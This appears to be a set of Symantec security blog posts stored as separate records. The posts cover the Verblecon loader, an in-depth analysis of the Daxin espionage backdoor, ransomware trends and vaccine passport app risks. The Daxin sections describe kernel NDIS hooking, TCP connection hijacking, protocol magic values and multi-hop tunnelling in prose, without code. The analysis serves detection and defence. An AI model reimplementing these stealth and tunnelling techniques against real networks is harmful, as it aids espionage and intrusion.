app that is particularly popular among the gaming community. Advertising Trojanized videogame applications via Discord is likely a redistribution channel for Trojan. Verblecon. Most of the infections we saw where this malware was used were on non-enterprise machines; we rarely see ransomware deployed on non-enterprise machines. Previous reportshave connected related domains to a single occurrence of ransomware, but the infrastructure may be shared with an unrelated actor. The similarities between that incident and the activity we observed includes: However, we do not have enough evidence to draw a definitive link between both these sets of activity. The activity we have seen carried out using this sophisticated loader indicates that it is being wielded by an individual who may not realize the capabilities of the malware they are using. However, if it fell into the hands of a more sophisticated actor the potential is there for this loader to be used for more serious attacks, including potentially ransomware and espionage campaigns.

    "text": "This is the concluding part of our in-depth analysis of Backdoor. Daxin, advanced malware that is being used by a China-linked espionage group. In this blog, we will analyze the communications and network features of the malware. In ourprevious blog, we set up a lab consisting of four separate networks and five machines. Some of the machines had two network interfaces to communicate with different networks, but all packet forwarding functionality was disabled. Each machine ran various network services that were reachable from its neighbors only. In this section we will dissect the network traffic between two backdoor instances running on the separate computers “Alice-PC” and “Bob-PC”. The traffic was initiated by the Daxin backdoor running on “Alice-PC” when it was instructed to create a communication channel to “Dave-PC” passing via two intermediate nodes, “Bob-PC” and “Charlie-PC”, as described previously. Using Wireshark, we captured traffic between two backdoor instances, one running on “Alice-PC” and the other on “Bob-PC”, as shown in Figure 2. Starting with the key exchange, all backdoor communication is carried out by exchanging messages that follow the same underlying format: Themagicvalue is always 0x9910 or 0x9911. Thekindvalue identifies the state transition during key exchange. Then, once the encrypted communication channel is established, it encodes the purpose of each message and determines the formatting of the data that follows the fixed-size header. The initial message of the key exchange in the Wireshark capture is not encrypted: It can be decoded as follows: The fieldsmagicandkindcorrespond to the first three bytes of TCP data, 0x10 0x99 0x11. On the target computer, in case it is infected with a copy of the malicious driver, this sequence causes the TCP connection to be hijacked, as explained inpart one of this blog series. The target checks that the received message is valid according to the session state machine, ensuring thatmagicis the expected constant 0x9910 andkindmatches any of two supported values: 0x10 or 0x11. Next, it generates a nonce to use when encrypting any future incoming messages. Finally, it sends a response message with the nonce, its own details, and the information about the infected machine. Parts of the response message are encrypted using a combination of the following algorithms: The details of this response message are as follows: The message includes the backdoor login that is recognized during the following key exchange step, and what looks like malware build and version numbers. Looking at the decoded message, we find references to “XRT” and these reassemble the hardcoded Name “NDISXRPT” that we documented when discussing theNdisRegisterProtocol()call during driver initialization: The initiator responds with the backdoor login and hashed password: It also includes its own nonce, like this: At this point, the peers exchange their nonces and compute two transport keys. Each transport key is used in stream mode to encrypt the TCP half-stream directed towards the side that generated the corresponding nonce. The peers also combined their nonces into the shared key. This shared key will be used to encrypt the body of each exchanged message, reusing the same key every time. The final key exchange message confirms that the initiator was successfully authenticated and the backdoor is ready to process instructions: It can be decoded as follows: For the messages that follow, thekindfield encodes the message purpose. This determines the formatting of the message body. For example, the backdoor instruction to set up new connectivity across multiple malicious nodes useskindvalue 6 with the following message body structure: We could continue to decrypt all the backdoor communication that follows: For example, the next message in the captured network traffic is: This instructs the backdoor to set up remaining connectivity across malicious nodes as explained in the “Backdoor capabilities” section in our previous blog: The most interesting observation about encryption is that Daxin supports two methods for computing the shared key during the key exchange. To select which of the two methods to use, the initiator examines the target message, comparing what looks like build and version numbers against certain hardcoded constants. This could be in order to facilitate upgrading the malicious network in the field without disruption. Additionally, the current key exchange implementation involves additional obfuscation that is not present in some older samples. It is possible that the attacker was forced to change the algorithm and decided to implement additional measures to protect the details of new logic. An alternative explanation is that different teams within the attacker organization were sharing the same codebase, where one of these teams implemented the alternative key exchange method and related obfuscations to mitigate against potential compromise due to the other team’s activity, while still sharing some of the communication infrastructure. The communications protocol documented in the previous section is how two backdoor instances communicate with each other. On top of that, the analyzed sample also supports two additional communication methods. These additional methods are well suited for crossing the perimeter of the target organization. One of these additional communication methods uses HTTP messages to encapsulate backdoor communications. To demonstrate this, we implemented our own client to interact with the backdoor using this method. Our client communicated with the backdoor instance running on “Alice-PC” over HTTP to control a set of infected machines, as discussed in the previous two sections. On the target computer, in case it is infected with a copy of Daxin, the first HTTP request causes the TCP connection to be hijacked due to the malicious packet filter triggering on the HTTP “POST” method string with URI substring “756981520337” as explained in the “Networking” section of our previous blog. Daxin then parses HTTP request headers and extracts the request body. The request body is then interpreted using the same logic as already described in the “Communications protocol” section. The reverse communication is then encapsulated as the HTTP response body. When generating the HTTP response, the malicious driver includes “SID” cookie. The value of “SID” cookie is then used when constructing the URI for the subsequent HTTP request. The malicious driver can also be configured to communicate with a remote TCP server for command and control. It then periodically connects to the remote server, performs a handshake that is unique to this connectivity method, and then starts backdoor communication. This connectivity method is controlled with persistent configuration that can be updated by the remote attacker, as explained in the “Backdoor capabilities” section of our previous blog. To obtain the details of the TCP server to connect to, Daxin checks the value of the “HOST” configuration item. In case the value starts with “http://”, the TCP server details are retrieved from the remote web server, as described below. Otherwise, the configuration value is interpreted as the TCP server address and port. In order to retrieve the TCP server details from the remote web server, the analyzed sample contacts the provided URL and scans the received HTTP response, including HTTP headers, for magic strings. Whenever it finds “f8xD4C01” followed later by “d7C6x12B”, it attempts to interpret any data immediately following the first marker as a hexadecimal string. The data obtained by decoding the hexadecimal string is then decrypted using the following algorithm: The decrypted data are interpreted as the TCP server address and port to use. Whenever the analyzed sample connects to the TCP server, it sends the following sequence of bytes as its handshake: Thetags_valueparameter is the value of the “TAGS” configuration item. We suspect that the remote server uses thetags_valuefor tracking specific infections. The analyzed sample then expects to receive the following hardcoded sequence of bytes from the remote server: This should be followed by the usual key exchange as described in the “Communication protocol” section, where the remote server acts as initiator.

    "text": "Ransomware continued to be the most significant cyber threat facing enterprises during 2021. While ransomware gangs are currently experiencing a period of turmoil and disruption, there is no guarantee that the threat posed by ransomware will abate in 2022, since similar disruptions in the past were usually followed by the emergence of new threats. According to anew whitepaperpublished by the Symantec Threat Hunter team, part ofBroadcom Software, targeted ransomware attacks continued to trend upwards in 2021, almost trebling between the first and final quarters of the year. One of the main developments during 2021 was the disappearance of established threat actors and the emergence of new groups to take their place. Of the major ransomware threats operating at the beginning of 2021, only Conti continued to remain active at year end. During 2021, a number of high-profile ransomware operations disappeared. These included Leafroller (aka Sodinokibi, REvil), Coreid (Darkside and Blackmatter), and Avaddon. However, a number of new actors have emerged to take their place. LockBit expanded rapidly following the departure of some of its rivals, while several new threats such as Pinion (Hive) and Sirex (AvosLocker) became quite active. One of the key trends noted in this research is the constantly evolving set of tools, tactics, and procedures (TTPS) employed by ransomware attackers. New TTPs emerge regularly as attackers bid to stay one step ahead of network defenders. Ransomware groups these days now employ quite a diverse toolset, making use of a mixture custom malware, legitimate software, and operating system features (also known as living off the land). This diverse toolset is evident in the ten most frequently employed TTPs Symantec’s Threat Hunter Team found in ransomware investigations. The most frequently used tool, PsExec, is a Windows operating system feature that is often abused by attackers for executing processes on other systems. The next most frequently used tool was Cobalt Strike, which is off-the-shelf malware ostensibly sold as a penetration testing tool but is most frequently seen being used for malicious purposes. New TTPs seen during the latter half of 2021 include abuse of VssAdmin, a legitimate Windows process that can be used to manage or delete shadow copies on Windows machines; along with abuse of MSIExec, a legitimate Windows installer that can be used by attackers to load malicious payloads onto targeted machines. This was just a sample of the content in our latest whitepaper. Read the full paperfor more insights into the ransomware threat landscape.

    "text": "Following on from ourearlier blogdetailing the discovery of Backdoor. Daxin, Symantec’s Threat Hunter Team, part of Broadcom Software, would like to provide further technical details on this threat. Used by a China-linked espionage group, Daxin exhibits technical sophistication previously unseen by such actors. In particular, it implements communications features that appear to have been designed for deep penetration of highly-secured networks. The focus of this blog series is to document how these features were implemented. Daxin comes in the form of a Windows kernel driver. In this blog, we will detail the driver initialization, networking, key exchange, and backdoor functionality. In our next blog, the second of two, we will examine the communications and network features of the malware. Our analysis is based on a Backdoor. Daxin sample (SHA256: ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef). The forensic evidence collected by us indicates that this sample had been deployed in November 2021 against two separate organizations. The described Daxin features are contained in many earlier Daxin variants unless stated otherwise. The recent changes to the driver codebase are to support more recent Windows versions and fix certain bugs. The Daxin sample analyzed appears to be packed with a standard VMProtect packer. Many earlier samples feature an additional, outside, packing layer on top of VMProtect. That outside packer was custom-made for the driver and even reused the same customized encryption algorithm used in the final payload. We believe that the attackers decided to remove that custom packer due to compatibility issues with recent Windows releases. Whenever the driver is started, the code added by the packer decrypts and decompresses the final payload, and then passes control to the entry point of the decompressed payload. At this point, the malicious code is visible in kernel memory, albeit with some obfuscations. The bulk of the payload initialization code is involved with the network stack of the Windows kernel. This includes identification of some non-exported structures and hooking of the Windows TCP/IP stack. Daxin hooks the Network Driver Interface Specification (NDIS) layer by modifying every pre-existingNDIS_OPEN_BLOCKfor the TCP/IP protocol, where theReceiveNetBufferListsandProtSendNetBufferListsCompletehandlers are replaced with its own. For each of theseNDIS_OPEN_BLOCKs, the relatedNDIS_M_DRIVER_BLOCKmay also be modified by replacing any existingSendNetBufferListsHandler. When theSendNetBufferListsHandleris not present, the correspondingNDIS_MINIPORT_BLOCKis modified by replacingNextSendNetBufferListsHandler. To identify allNDIS_OPEN_BLOCKsfor the TCP/IP protocol, the driver relies on callingNdisRegisterProtocol()to create and return a new head of non-exportedndisProtocolList. Then it walksndisProtocolListof everyNDIS_PROTOCOL_BLOCKcomparing theNameattribute of each visitedNDIS_PROTOCOL_BLOCKstructure with the string “TCPIP”. TheOpenQueuefield of the matching structure points to the list ofNDIS_OPEN_BLOCKsto hook. This basic technique isknown and documented, but Daxin hooks a slightly different set of handlers. We believe that these adjustments are not exclusive to Daxin and are driven by architectural changes in Windows Network Architecture. In order to identify the relatedNDIS_M_DRIVER_BLOCKsandNDIS_MINIPORT_BLOCKs, the driver analyses “ndis.sys” machine code to locate non-exportedndisFindMiniportOnGlobalList()andndisMiniDriverList. The relevantNDIS_MINIPORT_BLOCKsare then obtained starting with the previously identifiedNDIS_OPEN_BLOCKs, where theRootDeviceNameof each instance is passed as a parameter for thendisFindMiniportOnGlobalList()call that returns the structure to hook. Finally, to locate relatedNDIS_M_DRIVER_BLOCKs, the driver walksndisMiniDriverListchecking theMiniportQueuelist of each item for the already identifiedNDIS_MINIPORT_BLOCKs. Details of the hooking process demonstrated in this blog were captured in the lab using a virtual machine with a kernel debugger attached. When registering the fake protocol, Daxin calls theNdisRegisterProtocol()API passing aProtocolCharacteristicsargument with the hardcodedNameattribute “NDISXRPT”. Because the layout of theNDIS_OPEN_BLOCKstructure changes between different Windows builds, Daxin needs to determine the correct offsets to use. First it checksNtBuildNumberagainst a set of hardcoded values for whichNDIS_OPEN_BLOCKoffsets are explicitly given (Figure 2). The most recent Windows build number hardcoded in Daxin’s codebase is 17763. It corresponds to Windows Server 2019 and Windows 10 version 1809 (Redstone 5). When the Windows build is not recognized, Daxin attempts to use an alternative method to determine the NDIS_OPEN_BLOCK offsets. Daxin then collects details of all NDIS structures to hook, as discussed earlier, along with information about the related network interfaces. Finally, for each network interface, it replaces the original handlers with its own. Both theReceiveNetBufferListshook and theSendNetBufferListsHandler(orNextSendNetBufferListsHandler) hook implement logic to inspect the network packets and then hijack some packets before passing the remaining packets to the original handlers. TheProtSendNetBufferListsCompletehook completes any send operation initiated by Daxin, such thatNET_BUFFER_LISTstructures owned by malware are removed and deallocated before calling the original handler. Before describing the hooks’ implementation in detail, we will first examine a few examples of the observed behavior in Daxin. In the first scenario, theReceiveNetBufferListshook checks the data section of certain TCP packets for predefined patterns. Any matching TCP packets are then removed from theNetBufferListsbefore calling the originalReceiveNetBufferListshandler. At the same time, for each removed TCP packet, the malicious driver sends two new packets. The first packet is a spoofed RST TCP packet sent to the original destination, so that its recipient marks the TCP connection as closed. The second packet is an ACK TCP packet sent to the original source. From that point, the malicious driver maintains the TCP connection with the original source, relying on theReceiveNetBufferListshook to hijack any related network packets. A test demonstrating this scenario is illustrated in Figure 4. When generating its network traffic, Daxin uses its own code to forge network packets, bypassing the legitimate Windows TCP/IP stack. To illustrate this, we reconfigured the Windows TCP/IP stack to use non-standardTime to Live (TTL). Since Daxin does not respect the updated parameter, its traffic stands out in the Wireshark capture shown in Figure 4. The TCP retransmissions in the Wireshark capture are due to our scripts for the kernel debugger that slow down driver response. The retransmissions are not expected otherwise. We decided to activate these scripts to illustrate the internal working of the driver, where we can recognize individual packets from our Wireshark capture, as illustrated in Figure 5. In another scenario, Daxin initiates a new TCP connection and maintains it over the whole lifetime of the TCP session. The malware relies on theReceiveNetBufferListshook to hijack any network packets related to this connection. The hijacked packets do not reach the legitimate Windows TCP/IP driver. An example TCP connection initiated by the malicious driver will be discussed later in this blog series. In the last scenario, Daxin sends a DNS request using the UDP protocol. The response UDP packet is hijacked by theReceiveNetBufferListshook and the DNS response is parsed by the malicious driver. We exercised this functionality in our lab when exploring configuration options related to command-and-control connectivity. The described scenarios indicate that Daxin implements its own TCP/IP stack. This was confirmed with further reverse engineering of the driver, where we identified both data structures and subroutines implementing IPv4, TCP, and UDP. The main purpose of the NDIS hooks installed by Daxin is to allow for its malicious TCP/IP stack to coexist with the legitimate Windows TCP/IP stack on the same machine. When certain conditions are met, the hooks also allow it to hijack pre-existing TCP connections. TheReceiveNetBufferListshook checks theNblFlagsmember of theNET_BUFFER_LISTstructure at the head of itsNetBufferListsargument for theNDIS_NBL_FLAGS_IS_LOOPBACK_PACKETflag. Whenever the flag is set, the hook simply passes the network data to the originalReceiveNetBufferListshandler with no other processing. Otherwise, it calls a helper subroutine passing theNetBufferListslinked list ofNET_BUFFER_LISTs. The helper subroutine divides the original linked list ofNET_BUFFER_LISTsinto two chains: one chain of allowed packets for further processing by the legitimate stack and another chain of hijacked packets to drop. The hook then passes the chain of allowed packets to the originalReceiveNetBufferListshandler. Next, if theNDIS_RECEIVE_FLAGS_RESOURCESflag is not set in itsReceiveFlagsargument, the hook releases ownership of the chain of hijacked packets usingNdisReturnNetBufferLists(). TheSendNetBufferListsHandlerhook checks if theNdisPoolHandlemember of theNET_BUFFER_LISTstructure, passed as itsNetBufferListargument, corresponds to the pool created by Daxin itself to use when sending malicious traffic. If so, the hook simply passes the network data to the originalSendNetBufferListsHandlerwith no other processing. Otherwise, it calls the same helper subroutine as used by theReceiveNetBufferListshook to divide itsNetBufferListargument into two chains. It then passes the chain of allowed packets to the originalSendNetBufferListsHandler. Finally, the chain of hijacked packets is retired using theNdisMSendNetBufferListsComplete()orProtSendNetBufferListsCompletehandler. The helper subroutine used by both hooks walks the original linked list ofNET_BUFFER_LISTsextracting network packets from each visitedNET_BUFFER_LISTstructure and calling the malicious packet filter for each extracted packet. The verdict returned by the packet filter for the first packet from the visitedNET_BUFFER_LISTstructure determines if the structure should be allowed for further processing by the legitimate stack or dropped by the hook. The packet filter is central to the networking capabilities of Daxin as it controls dispatching of the extracted packets to various Daxin's sub-modules, where each sub-module implements different functionality. The filter returns an “accept” or “drop” verdict to indicate if relevant packets should reach the legitimate TCP/IP stack or not. It operates as follows: Finally, theProtSendNetBufferListsCompletehook walks the list ofNET_BUFFER_LISTstructures passed as its second argument checking if theNdisPoolHandlemember of the visitedNET_BUFFER_LISTstructure corresponds to the pool created by the malicious driver itself to use when sending malicious traffic. The matching structures are removed from the list and, after validating the Flags member, deallocated. The hook then passes the modified list to the originalProtSendNetBufferListsCompletehandler. Atechnical paper by Kasperskyon the Slingshot advanced persistent threat (APT) group describes a technique to identifyNET_BUFFER_LISTthat is very similar to how theProtSendNetBufferListsCompletehook works, including the use ofNdisAllocateNetBufferListPool()andNdisAllocateNetBufferAndNetBufferList(). However, there are no other significant structural overlaps. Whenever Daxin hijacks a TCP connection, it checks the received data for a specific message. The expected message initiates a custom key exchange, where two peers follow complementary steps. When discussing this key exchange protocol, we are going to use the term “initiator” when referring to the side sending the initial message. The opposite side will be called “target”. Interestingly, the analyzed sample can implement both the initiator side and the target side of this custom key exchange protocol. Firstly, Daxin starts the target-side protocol for each hijacked TCP connection. Additionally, it can be configured to connect to a remote TCP server, where it exchanges a certain handshake and then also starts the target-side protocol. This scenario will be discussed in our next blog in this series in a section titled “External communication.” Finally, Daxin can be instructed to connect to a remote TCP server, where it starts the initiator-side protocol. We will expand on this in the next section. A successful key exchange opens an encrypted communication channel. Daxin uses this communication channel to exchange various messages. Some messages instruct the malware to perform various operations, such as starting an arbitrary process on the affected computer. Others carry results of these operations, such as output generated by the started process, for example. The set of operations recognized by Daxin is rather compact, with the most basic operations being reading and writing arbitrary files. Daxin can also execute arbitrary EXE and DLL binaries. In the case of EXE files, Daxin starts a new user-mode process. The standard input and output of the started process is redirected, so that the remote attacker can interactively send input and receive output. When ordered to execute a DLL file, Daxin performs injection into one of the pre-existing “svchost.exe” processes. Daxin provides a dedicated communication mechanism for any additional components deployed by the attacker on the affected computer. Any compatible component can open a “\\\\.\\Tcp4” device created by Daxin to register itself for communication, where it can optionally assign a 32-bit service identifier to distinguish itself from other services that may be active on the same computer. Daxin then forwards any matching communication between the remote attacker and registered services. Next, the remote attacker can inspect and update the backdoor configuration. The configuration is implemented as a generic key-value structure that is stored in an encrypted form in the Windows Registry for persistence. All used configuration items will be listed in the “External communication” section in a subsequent blog. There are also dedicated messages that encapsulate raw network packets to be transmitted via a local network adapter. Any response packets are then captured by the malicious driver and forwarded to the remote attacker. This allows the remote attacker to establish communications with any servers reachable from the affected machine on the target’s network, creating a network tunnel for the remote attacker to interact with servers of interest. Finally, a special message can be used to set up new connectivity across multiple malicious nodes, where the list of nodes is included in a single command. For each node, the message provides the details required to establish communication, specifically the node IP address, its TCP port number, and the credentials to use during custom key exchange. When Daxin receives this message, it picks the next node from the list. Then it uses its malicious TCP/IP stack to connect to the TCP server listed in the picked entry. Once connected, Daxin starts the initiator-side protocol. On the peer computer, if it is infected with a copy of Daxin, the initiator traffic causes the TCP connection to be hijacked, as explained earlier. This is followed by the custom key exchange to open a new encrypted communication channel. Next, the connecting driver sends an updated copy of the original message over this new channel, where the position of the next node to use is incremented. The process then repeats for the remaining nodes on the list. The TCP connections created during the above process, along with the connection that received the original connectivity setup instruction are then used for subsequent communications. Whenever an intermediate node receives a message, it may execute the requested operation or forward it along the connectivity path. For certain operations, the node to execute the operation is specified by the position along the path. In some remaining cases, the operation is always forwarded to the last node. Finally, certain operations are always executed by the first node only. This method to create multi-hop connectivity is noteworthy. It is not uncommon for the attackers to jump through multiple hops in victim networks to get around firewalls or to better blend in with usual network traffic. This usually involves multiple steps when using other malware, where each jump requires a separate action. However, in the case of the analyzed sample, the attackers combined these into a single operation. This may indicate that Daxin is optimized for attacks against well-protected networks and cases when the attackers need to periodically reconnect into the compromised network. The ability to use hijacked TCP connections for backdoor communications is also significant. This may be required when exploiting tightly controlled networks, with strict firewall rules or when the defenders monitor for network anomalies. On the infected machine, any malicious network connections are bypassing the Windows TCP/IP stack, and this could provide some degree of stealth. The attackers invested significant effort in implementing these features with a malicious TCP/IP stack supporting TCP connection hijacking. The implementation of network tunneling, where the malicious driver passes the packets directly between the remote attacker and the target’s network demonstrates how the attackers attempt to minimize their footprint without sacrificing functionality. In order to demonstrate Daxin’s backdoor capabilities, we prepared a lab setup to both illustrate what was described in the previous section and also to collect some examples of malicious network traffic to discuss later. Our lab setup consisted of four separate networks and five machines. Some of the machines had two network interfaces to communicate with different networks, but all packet forwarding functionality was disabled. Each machine ran various network services that were reachable from its neighbors only. In our setup, the attackers can communicate with “Alice-PC”, while all of the other machines are unreachable directly to the attackers. This simulates the network of a hypothetical victim, where machines serving different roles have very restrictive connectivity. “Alice-PC” could represent a DMZ service that is accessible from the internet, but all the other machines are tightly isolated. We infected all of the configured machines with Daxin, except for just one machine deep in our network that was left clean. Next, based on our understanding of the malicious communications protocol gained during reverse engineering of the malicious driver, we implemented a rough client to interact with the Daxin backdoor running on “Alice-PC”. We used this client to instruct the backdoor on “Alice-PC” to create a communications channel to “Dave-PC” passing via two intermediate nodes: “Bob-PC” and “Charlie-PC”. The connectivity was established successfully, and we were able to interact with all the infected machines. Finally, we were able to use this malicious network tunnel via “Dave-PC” to communicate with legitimate services on “Clean-PC”. This concludes the first part of our technical analysis of Daxin. In our second, and final blog, we will examine the communications and networking features of the malware.

    "text": "As the world becomes accustomed to living with COVID-19, people are increasingly having to prove they are vaccinated, often via the use of so-called digital vaccine passports containing their identity and vaccination record. Employers, restaurants, even the neighborhood bar are relying on this system to be secure, accurate, and to maintain user privacy. The person using the passport is also expecting the same thing. With a lack of federal guidance or global policy, it has been left up to country, state, or even local municipalities to decide what passes as an \"official\" vaccine passport. Without clear requirements, the private and public sector providers of vaccine passport apps must tackle evaluating a technology and workflow that includes collecting the minimum amount of medical data and personal identifiable information (PII) required to prove vaccination records are legitimate. Symantec, a division ofBroadcom Software, took a look at how these digital vaccine passports work and the potential security risks and threat scenarios they present. A vaccine passport is a paper or digital form certifying a person has been vaccinated against a disease, in this case COVID-19. While paper passports may be used, more often the digital form is used, which may, in some cases, be only a screenshot of the results or picture directly taken of the vaccine card (this may work in some cases, although it lacks authenticity that the results are from the provider and have not been tampered with). Digital vaccination passports have QR codes that contain and connect a user’s encoded health data (a vaccination record from a medical provider) to the vaccinated person's passport app. Issuers of the encoded vaccination data include healthcare providers and government entities. These entities follow one of two standards concerning the structure of the encoded data. The first standard, followed primarily by issuers in the U. S. and Canada, is the SMART Health Card Framework from VCI, a broad coalition of leading healthcare and technology organizations. The second standard, recognized internationally, is the EU Digital COVID Certificate and uses the Electronic Health Certificate Container Format (HCERT). Both standards use QR codes and are very similar as far as data structure, with one key difference as we will see below. The tools, or validation apps, used to decode the vaccination data in the passport app QR codes are readily available. Using one of these tools, we will take a look at the data contained in one of the QR codes, using an example code from California's digital vaccine record system. Note the \"SMART\" logo (Figure 1) identifying it as a SMART Health Card. $ zbarimg qrcode_passport.png --raw --quiet shc:/567629095243206034602924374044603122295953265460346029254077280433602 8702864716745222809286155305564710341432164324111083963210645240371337721 2638633677424237084126633945392929556404425627596537253338446120605736010 645315539723274242843574557440550766267775…. The shc:/ further identifies the SMART Health scheme and the data encodes to a JSON Web Token (JWT). Note that the data is not encrypted, simply encoded. Encoded meaning it may look like just black bars and numbers but decodes directly to the raw vaccination data. Once decoded, we find that the data mainly contains the same data as the paper version of the vaccination record. Specifically, the full set of data, in this example, includes: $ zbarimg qrcode_passport.png --raw --quiet | xargs ./jwt_tool.py --shc JWT Token: eyJ6aXAiOiJERUYiLCJhbGciOiJFUzI1NiIsImtpZCI6IjdKdmt0VXBmMV85TlB3ZE0tNzBGSlQzWWR5VGlT[...]. 3ZLdTuMwEIXfZfY2_ykpzeW[...].

The same data can be used to copy and generate the same QR code. The signature, on the other hand, can be used to verify that the passport has not been changed or tampered with and that it came from the issuer, in this case the State of California. By providing the signature and sharing the public key, anyone can verify the vaccine passport has not been tampered with and is from the issuer. Internationally, QR code vaccination records use the Electronic Health Certificate Container Format (HCERT). Similar to the SMART Health Card, the QR image contains a header, payload, and signature. The payload contains mostly the same vaccination record data - name, date of birth, vaccination record, and dates. The signature is also used to validate the authenticity of the digital vaccination record. However, the difference is in the header. SMART Health Cards contain a link/URL to the issuer in the header, which contains the public key used to validate the authenticity of the record using the signature. HCERT QR codes only contain the name of the issuer in the header, and it is up to the verifier app to find and store the public key from the issuer. What are the actual data privacy risks associated with digital vaccine passports? At a minimum, the personal data they contain includes the person's name, date of birth, and vaccine status. This data may be considered medical data and, if exposed, poses a risk if obtained by scammers, who may use it for targeted phishing attacks. Another, and arguably greater and potentially graver risk, is the validity and accuracy of the vaccine passport. Similar to traditional passports, counterfeiting or tampering with the results may in some jurisdictions result in criminal penalties. Therefore, the technology to identify digital vaccine passports must securely and accurately identify their validity and ensure the results have not been tampered with. Otherwise, people may be exposed to the virus and this could come with deadly consequences. We analyzed 40 digital vaccine passport apps and 10 validation apps. The apps we examined were from government entities and regional health providers in multiple countries around the world. Digital vaccine passports are commonly stored on a person's mobile device inside a digital wallet. This provides the convenience of being able to quickly and easily open and show vaccination records when requested. If done right, the person can be confident the data is accurate and secure. Not done right, and the vaccination record can potentially be read by an attacker, either via a network attack or a malicious app on the user’s mobile device. Note that our app analysis focused on publicly available mobile apps used to store vaccination records. Apple and Google also provide storage and retrieval for vaccine passports - Apple via the Health App and Google via Google Wallet - and while our findings for these solutions didn't raise any security flags, it is important to note that both rely on app sandbox protection and sharing permissions to protect vaccination records. This means that if the mobile device is compromised by an attacker, or if the user is tricked into sharing the health data, all bets are off. Wallets that store data in the cloud may expose the user’s vaccination records by including hardcoded cloud credentials inside the app. During our analysis we also found wallets containing hardcoded cloud credentials, potentially exposing sensitive users’ data. Vaccine records may also be exposed if the digital wallet app transfers data from the cloud unencrypted or insecurely. In addition, vaccine records may be exposed if the user unknowingly shares the health data to other apps on their device, or if the vaccine records are stored insecurely on the device. Knowing these threat scenarios, we analyzed the apps looking for risky behaviors that include: Out of the 40 digital passport wallet apps analyzed, 27 exhibited at least one of these risky behaviors. To verify that a vaccine passport is legitimate, validation apps exist that decode the data in the QR code and flag if the vaccination record has been tampered with. As we saw when decoding the example QR code, a signature is contained inside the record that can be used to verify that the record is from the issuer and has not been tampered with. How do we know the QR code is from a specific health provider or issuer? Also inside the QR code is the link to the public key used to sign the record, which is then used to validate the signature. Anyone can create a QR code and put in their own issuer links, therefore a validation app must show and/or whitelist only approved issuers. Otherwise, anyone could use a fake state or medical named issuer URL with fake vaccination record data and the validation app would blindly pass the person. This type of flaw wasfound in the Quebec Vaxicode Verif app in late 2021. When transferring the public key from the issuer or health provider, the URL must be securely accessed and transferred to the mobile device running the app. If the validation app insecurely accesses the URL, an attacker may change the public key and \"pass\" their fake vaccination record. Or, even more deviously, change it to selectively fail other vaccination records. Often validation apps also store the digital vaccine records, either locally or in the cloud. If that is the case, which ideally it shouldn't be, the validation apps are subject to the same risks and threat scenarios as digital wallet apps. Knowing this, we looked for the same previously listed risky behaviors in seven validation apps available at the time of this report and found all of them to be safe. That being said, we will continue to scan new versions of those apps, as well as new validation apps, as they appear on our customers' mobile devices. This is yet another reminder to always be vigilant of apps claiming to protect your privacy and identity, including digital passport wallets. Only give apps permission to private data that they require, nothing more. Whenever possible, avoid third-party apps claiming to securely store your vaccination records and instead use digital wallet solutions provided by the major mobile platforms, such as the Apple Health app and Google Wallet. App developers should only collect and access the user data required to provide the service to the user. Developers should also understand and implement best security practices that protect the users’ private data in the cloud, in transit, and on device. Anything less may compromise your users’ privacy, expose personal medical data, and potentially undermine the legitimacy of their vaccination records entirely.

    "text": "New research by the Symantec Threat Hunter team, part of Broadcom Software, has uncovered a highly sophisticated piece of malware being used by China-linked threat actors, exhibiting technical complexity previously unseen by such actors. The malware appears to be used in a long-running espionage campaign against select governments and other critical infrastructure targets. There is strong evidence to suggest the malware, Backdoor. Daxin, which allows the attacker to perform various communications and data-gathering operations on the infected computer, has been used as recently as November 2021 by attackers linked to China. Most of the targets appear to be organizations and governments of strategic interest to China. In addition, other tools associated with Chinese espionage actors were found on some of the same computers where Daxin was deployed. Daxin is without doubt the most advanced piece of malware Symantec researchers have seen used by a China-linked actor. Considering its capabilities and the nature of its deployed attacks, Daxin appears to be optimized for use against hardened targets, allowing the attackers to burrow deep into a target’s network and exfiltrate data without raising suspicions. Through Broadcom’s membership in the Joint Cyber Defense Collaborative (JCDC), Symantec researchersworked with the Cyber Security and Infrastructure Security Agency (CISA) to engage with multiple foreign governments targeted with Daxinand assisted in detection and remediation. This is the first in a series of blogs. This blog provides an overview of Daxin’s capabilities and will be followed with additional blogs providing further in-depth analysis. As described in more detail below, Daxin comes in the form of a Windows kernel driver, a relatively rare format for malware nowadays. It implements advanced communications functionality, which both provides a high degree of stealth and permits the attackers to communicate with infected computers on highly secured networks, where direct internet connectivity is not available. These features are reminiscent of Regin,an advanced espionage tool discovered by Symantec in 2014that others have linked to Western intelligence services. Daxin’s capabilities suggest the attackers invested significant effort into developing communication techniques that can blend in unseen with normal network traffic on the target’s network. Specifically, the malware avoids starting its own network services. Instead, it can abuse any legitimate services already running on the infected computers. Daxin is also capable of relaying its communications across a network of infected computers within the attacked organization. The attackers can select an arbitrary path across infected computers and send a single command that instructs these computers to establish requested connectivity. This use case has been optimized by Daxin’s designers. Daxin also features network tunneling, allowing attackers to communicate with legitimate services on the victim’s network that can be reached from any infected computer. Daxin is a backdoor that allows the attacker to perform various operations on the infected computer such as reading and writing arbitrary files. The attacker can also start arbitrary processes and interact with them. While the set of operations recognized by Daxin is quite narrow, its real value to attackers lies in its stealth and communications capabilities. Daxin is capable of communicating by hijacking legitimate TCP/IP connections. In order to do so, it monitors all incoming TCP traffic for certain patterns. Whenever any of these patterns are detected, Daxin disconnects the legitimate recipient and takes over the connection. It then performs a custom key exchange with the remote peer, where two sides follow complementary steps. The malware can be both the initiator and the target of a key exchange. A successful key exchange opens an encrypted communication channel for receiving commands and sending responses. Daxin’s use of hijacked TCP connections affords a high degree of stealth to its communications and helps to establish connectivity on networks with strict firewall rules. It may also lower the risk of discovery by SOC analysts monitoring for network anomalies. Daxin’s built-in functionality can be augmented by deploying additional components on the infected computer. Daxin provides a dedicated communication mechanism for such components by implementing a device named “\\\\.\\Tcp4”. The malicious components can open this device to register themselves for communication. Each of the components can associate a 32-bit service identifier with the opened \\\\.\\Tcp4 handle. The remote attacker is then able to communicate with selected components by specifying a matching service identified when sending messages of a certain type. The driver also includes a mechanism to send back any responses. There are also dedicated messages that encapsulate raw network packets to be transmitted via the local network adapter. Daxin then tracks network flows, such that any response packets are captured and forwarded to the remote attacker. This allows the attacker to establish communication with legitimate services that are reachable from the infected machine on the target’s network, where the remote attacker uses network tunnels to interact with internal servers of interest. Perhaps the most interesting functionality is the ability to create a new communications channel across multiple infected computers, where the list of nodes is provided by the attacker in a single command. For each node, the message includes all the details required to establish communication, specifically the node IP address, its TCP port number, and the credentials to use during custom key exchange. When Daxin receives this message, it picks the next node from the list. Then it uses its own 